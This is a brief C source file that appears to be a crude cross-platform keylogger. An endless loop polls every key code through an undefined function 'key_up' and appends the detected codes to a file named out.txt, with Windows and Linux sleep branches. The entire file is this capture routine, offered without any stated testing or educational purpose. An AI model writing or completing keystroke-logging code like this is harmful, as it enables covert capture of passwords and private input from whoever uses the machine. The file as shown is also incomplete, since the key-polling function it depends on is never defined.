#ifdef WIN32

#include <windows.h>

#endif//WIN32

#ifdef __linux__

#include <unistd.h>
#include <GL/glx.h>

Display *linux_display;

#endif //__linux__

#include <stdio.h>


void write_key_code(FILE *f)
{
    unsigned char i=0;

    for(i=0; i<255; i++)
        if(key_up(i))
            fputc(i, f);
}


int main()
{
    #ifdef __linux__
    linux_display=XOpenDisplay(NULL);;
    #endif //__linux__

    int   i;
    FILE *f;

    for(;;)
    {
        f=fopen("out.txt", "a");

        for(i=0; i<1000000000; i++)
        {
            write_key_code(f);

            #ifdef WIN32
            Sleep(1);
            #endif

            #ifdef __linux__
            usleep(1000);
            #endif
        }

        fclose(f);
    }

    return 0;
}
